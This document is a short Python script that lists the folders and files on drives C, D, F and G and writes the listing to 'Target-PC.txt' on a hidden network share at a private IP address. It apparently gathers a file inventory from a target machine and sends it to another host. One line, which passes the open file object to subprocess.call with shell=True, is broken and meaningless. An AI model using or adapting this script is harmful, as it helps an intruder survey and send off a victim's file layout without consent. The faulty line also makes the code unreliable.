import os
import subprocess
drives = ["C:\\","D:\\","F:\\","G:\\"]
file = r"\\192.168.1.251\data$\Yogesh\Target-PC.txt"
f = open(file,"w+")
print(f)
subprocess.call(f,shell = True)
def extract():
    
       for drive in drives:
        try:
            for dirName in os.listdir(drive):
                print(dirName)
                f.write("Directory : " + dirName + "\n")
                try:
                 for filename in os.listdir(drive + dirName + "\\"):
                       
                       print(filename)
                       f.write("\t\tFile : " + filename+ "\n")
                except:
                     continue
        except FileNotFoundError:
                    continue
         
    
extract()
f.close()
